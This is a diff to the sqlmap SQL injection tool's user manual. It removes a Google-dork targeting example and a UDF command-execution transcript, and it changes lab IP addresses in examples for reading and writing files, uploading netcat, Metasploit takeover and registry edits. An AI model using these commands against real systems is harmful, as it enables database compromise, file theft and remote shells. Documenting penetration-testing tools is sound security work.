@@ -1053,31 +1053,6 @@ first 100 results for the Google dork expression with <tt>GET</tt>
 parameters asking you if you want to test and inject on each possible
 affected URL.
 
-<p>
-Example of Google dorking with expression <tt>site:yourdomain.com
-ext:php</tt>:
-
-<tscreen><verb>
-$ python sqlmap.py -g "site:yourdomain.com ext:php" -v 1
-
-[hh:mm:38] [INFO] first request to Google to get the session cookie
-[hh:mm:40] [INFO] sqlmap got 65 results for your Google dork expression, 59 of them are 
-testable hosts
-[hh:mm:41] [INFO] sqlmap got a total of 59 targets
-[hh:mm:40] [INFO] url 1:
-GET http://yourdomain.com/example1.php?foo=12, do you want to test this 
-url? [y/N/q] n
-[hh:mm:43] [INFO] url 2:
-GET http://yourdomain.com/example2.php?bar=24, do you want to test this 
-url? [y/N/q] n
-[hh:mm:42] [INFO] url 3:
-GET http://thirdlevel.yourdomain.com/news/example3.php?today=483, do you 
-want to test this url? [y/N/q] y
-[hh:mm:44] [INFO] testing url http://thirdlevel.yourdomain.com/news/example3.php?today=483
-[...]
-</verb></tscreen>
-
-
 <sect2>Load options from a configuration INI file
 
 <p>
@@ -1355,7 +1330,7 @@ Rather than using all hosts parsed from provided logs with switch
 <tt>-l</tt>, you can specify valid Python regular expression to be used
 for filtering desired ones.
 
-Example usage:
+Example of valid syntax:
 
 <tscreen><verb>
 $ python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
@@ -2019,21 +1994,22 @@ You can also provide the <tt>-C</tt> option to specify the table columns
 name like the one you provided to be enumerated.
 
 <p>
-Example against a MySQL target:
+Example against a SQLite target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://debiandev/sqlmap/mysql/get_int.php?id=1" --columns -D testdb \
+$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb \
   -T users -C name
 [...]
-Database: testdb
+Database: SQLite_masterdb
 Table: users
-[2 columns]
-+---------+---------------+
-| Column  | Type          |
-+---------+---------------+
-| name    | varchar(500)  |
-| surname | varchar(1000) |
-+---------+---------------+
+[3 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| id      | INTEGER |
+| name    | TEXT    |
+| surname | TEXT    |
++---------+---------+
 </verb></tscreen>
 
 <p>
@@ -2065,7 +2041,7 @@ database name is used.
 Example against a Firebird target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://debiandev/sqlmap/firebird/get_int.php?id=1" --dump -T users
+$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
 [...]
 Database: Firebird_masterdb
 Table: USERS
@@ -2267,39 +2243,12 @@ These techniques are detailed in the white paper
 name="Advanced SQL injection to operating system full control">.
 
 <p>
-Example against a PostgreSQL target:
-
-<tscreen><verb>
-$ python sqlmap.py -u http://192.168.136.131/sqlmap/pgsql/get_int8.4.php?id=1 --udf-inject -v 0
-
-[...]
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: PostgreSQL
-
-which is the local path of the shared library? udf/postgresql/linux/8.4/lib_postgresqludf_sys.so
-how many user-defined functions do you want to create from the shared library? 1
-what is the name of the UDF number 1? sys_eval
-how many input parameters takes UDF 'sys_eval'? (default: 1) 
-what is the data-type of input parameter number 1? (default: text) 
-what is the data-type of the return value? (default: text) 
-do you want to call your injected user-defined functions now? [Y/n/q] y
-which UDF do you want to call?
-[1] sys_eval
-[q] Quit
-> 1
-what is the value of the parameter number 1 (data-type: text)? echo test
-do you want to retrieve the return value of the UDF? [Y/n] 
-return value:    'test'
-
-do you want to call this or another injected UDF? [Y/n] n
-do you want to remove UDF 'sys_eval'? [Y/n] y
-[12:00:10] [WARNING] remember that UDF shared object files saved on the file system can only 
-be deleted manually
-</verb></tscreen>
+Use switch <tt>-</tt><tt>-udf-inject</tt> and follow the instructions.
 
 <p>
 If you want, you can specify the shared library local file system path
-via command line using <tt>-</tt><tt>-shared-lib</tt> option.
+via command line too by using <tt>-</tt><tt>-shared-lib</tt> option. Vice
+versa sqlmap will ask you for the path at runtime.
 
 <p>
 This feature is available only when the database management system is
@@ -2332,7 +2281,7 @@ Example against a Microsoft SQL Server 2005 target to retrieve a binary
 file:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
   --file-read "C:/example.exe" -v 1
 
 [...]
@@ -2343,14 +2292,14 @@ back-end DBMS: Microsoft SQL Server 2005
 
 [hh:mm:50] [INFO] fetching file: 'C:/example.exe'
 [hh:mm:50] [INFO] the SQL query provided returns 3 entries
-C:/example.exe file saved to:    '/tmp/sqlmap/output/192.168.136.131/files/C__example.exe'
+C:/example.exe file saved to:    '/tmp/sqlmap/output/192.168.136.129/files/C__example.exe'
 [...]
 
-$ ls -l output/192.168.136.131/files/C__example.exe 
--rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.131/files/C__example.exe
+$ ls -l output/192.168.136.129/files/C__example.exe 
+-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe
 
-$ file output/192.168.136.131/files/C__example.exe 
-output/192.168.136.131/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
+$ file output/192.168.136.129/files/C__example.exe 
+output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
 80386 32-bit
 </verb></tscreen>
 
@@ -2383,7 +2332,7 @@ $ file /tmp/nc.exe.packed
 $ ls -l /tmp/nc.exe.packed
 -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /tmp/nc.exe.packed
 
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.aspx?id=1" --file-write \
+$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
   "/tmp/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
 
 [...]
@@ -2554,7 +2503,7 @@ name="Expanding the control over the operating system from the database">.
 Example against a MySQL target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.128/sqlmap/mysql/get_int_51.aspx?id=1" \
+$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int_51.aspx?id=1" \
   --os-pwn -v 1 --msf-path /tmp/metasploit
 
 [...]
@@ -2634,7 +2583,7 @@ provided key, with <tt>-</tt><tt>-reg-data</tt> value data, while with
 A sample command line for adding a registry key hive follows:
 
 <tscreen><verb>
-$ python sqlmap.py -u http://192.168.136.128/sqlmap/pgsql/get_int.aspx?id=1 --reg-add \ 
+$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add \ 
   --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
 </verb></tscreen>
 
